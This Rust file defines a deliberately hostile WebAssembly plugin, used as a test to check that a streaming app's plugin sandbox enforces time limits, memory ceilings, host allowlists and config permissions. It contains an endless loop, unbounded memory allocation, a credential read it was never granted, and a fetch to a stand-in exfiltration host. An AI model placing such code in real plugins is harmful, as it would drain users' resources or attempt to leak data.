//! A deliberately misbehaving plugin.
//!
//! Test infrastructure, not an example. Every function here does something a hostile or broken
//! third-party plugin would do, so the host's sandbox can be shown to hold rather than asserted
//! to. A sandbox with no adversary in its test suite is a sandbox nobody has tried.
//!
//! | Call | Attack |
//! |---|---|
//! | `search` | Never returns — the epoch deadline must stop it. |
//! | `list-episodes` | Fetches a host it did not declare — the allowlist must deny it. |
//! | `resolve` | Allocates without bound — the memory ceiling must stop it. |
//! | `sources` | Reads a setting it was never granted — the host must answer `none`. |
//! | `describe` | Declares one innocuous host, so the denial above is a real escape attempt. |
//!
//! Note what it does *not* need to try: opening a socket, reading a file, or reading an
//! environment variable. Those are not in the WIT world, so there is no function to call — the
//! sandbox is structural for those, and only the four above are worth testing.

#[allow(warnings)]
mod bindings {
    wit_bindgen::generate!({
        path: "../../wit/anistream-provider.wit",
        world: "plugin",
    });
}

use bindings::{
    anistream::provider::host,
    exports::anistream::provider::provider::{
        Episode, Guest, Manifest, MediaStream, ProviderError, SearchHit, SourceCandidate,
    },
};

struct Component;

impl Guest for Component {
    fn describe() -> Manifest {
        Manifest {
            id: "test-hostile".into(),
            display_name: "Hostile (test only)".into(),
            version: "0.1.0".into(),
            // Declares one harmless host. `list_episodes` then tries a different one, which is
            // what makes that an escape attempt rather than a mistake.
            allowed_hosts: vec!["allowed.example".into()],
            translation_types: vec!["sub".into()],
            capabilities: vec![],
        }
    }

    /// Spins forever. Only the host's epoch interruption can stop this.
    fn search(_query: String, _translation: String) -> Result<Vec<SearchHit>, ProviderError> {
        // `black_box` so the optimiser cannot decide an infinite loop with no effects is
        // unreachable and delete it — which would make the test pass for the wrong reason.
        let mut spin: u64 = 0;
        loop {
            spin = spin.wrapping_add(1);
            std::hint::black_box(spin);
        }
    }

    /// Tries to reach a host the manifest never declared.
    fn list_episodes(_id: String, _translation: String) -> Result<Vec<Episode>, ProviderError> {
        let result = host::fetch(&host::HttpRequest {
            method: "GET".into(),
            // The canonical exfiltration target: somewhere the user never approved.
            url: "https://exfiltrate.example/steal".into(),
            headers: vec![],
            body: None,
        });

        match result {
            // Reported back so the test can tell a denial from a network failure — the host must
            // deny this *before* attempting any connection.
            Err(host::HostError::Denied(m)) => Err(ProviderError::Other(format!("denied: {m}"))),
            Err(other) => Err(ProviderError::Other(format!("not-denied: {other:?}"))),
            Ok(_) => Err(ProviderError::Other("ESCAPED: the fetch succeeded".into())),
        }
    }

    /// Allocates until the ceiling stops it.
    fn resolve(
        _id: String,
        _episode: String,
        _translation: String,
    ) -> Result<Vec<MediaStream>, ProviderError> {
        let mut hoard: Vec<Vec<u8>> = Vec::new();
        loop {
            // 4 MiB at a time: fast enough to hit any sane ceiling quickly, small enough that the
            // ceiling is what stops it rather than one huge request being refused outright.
            hoard.push(std::hint::black_box(vec![0xAB_u8; 4 * 1024 * 1024]));
            if hoard.len() > 4096 {
                // 16 GiB without being stopped means the ceiling is not wired up.
                return Err(ProviderError::Other("ESCAPED: allocated without bound".into()));
            }
        }
    }

    /// Reads a setting it was never granted — the host must answer `none`, not trap.
    fn sources(
        _id: String,
        _episode: String,
        _translation: String,
    ) -> Result<Vec<SourceCandidate>, ProviderError> {
        match host::config_get("credential-that-does-not-exist") {
            None => Ok(Vec::new()),
            Some(value) => {
                Err(ProviderError::Other(format!("ESCAPED: config-get leaked {value:?}")))
            }
        }
    }

    /// An id nobody issued. `not-found` is the only correct answer.
    fn resolve_source(
        _id: String,
        _episode: String,
        _translation: String,
        _source_id: String,
    ) -> Result<Vec<MediaStream>, ProviderError> {
        Err(ProviderError::NotFound)
    }
}

bindings::export!(Component with_types_in bindings);
